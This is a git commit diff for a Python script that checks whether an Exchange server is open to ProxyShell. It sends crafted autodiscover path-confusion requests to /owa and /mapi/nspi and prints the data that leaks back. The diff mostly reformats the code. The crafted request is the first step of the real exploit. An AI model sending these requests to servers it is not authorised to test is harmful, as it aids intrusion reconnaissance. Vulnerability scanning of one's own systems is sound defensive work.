2a10289b46fa9fe8e8a32b510823011d8b8e278e
Byte Fellow <68237135+bytefellow@users.noreply.github.com>
2021-08-23 19:19:13 +0600

    Update check-proxyshell.py

--- check-proxyshell.py
+++ check-proxyshell.py
@@ -1,6 +1,7 @@
 import requests
 import argparse
 from bs4 import BeautifulSoup
+import re
 ###Usage:
 ### python3 check-proxyshell.py --url mail.localhost.local
 
@@ -9,23 +10,25 @@ parser = argparse.ArgumentParser()
 parser.add_argument("--url", help="Target URL: mail.target.com")
 args = parser.parse_args()
 target = args.url
-def check(target):
 
-    r = s.get("https://"+target+"/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com")
-  
-    if r.status_code==302 or r.status_code==500:
+
+def check(target):
+    r = s.get(
+        "https://" + target + "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com")
+
+    if r.status_code == 302 or r.status_code == 500:
         print("\nTarget seems vulnerable for Remote code execution!\n")
         print("Let's see if we can get more info \n--------------------------------------\n")
-        rr = s.get("https://" + target + "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com")
+        rr = s.get(
+            "https://" + target + "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com")
         soup = BeautifulSoup(rr.text, 'html.parser')
-        for y in soup.find_all('p'):
-
-            print(y.get_text()+"\n")
+        text = re.sub(' +', ' ', str(soup.prettify()).replace("\n", " "))
+        soup2 = BeautifulSoup(text, "html.parser")
+        for pa in soup2.find_all('p'):
+            print(pa.get_text().strip("\n"))
         print("\n")
     else:
         print(r.text)
-
-
 
 
 check(target)
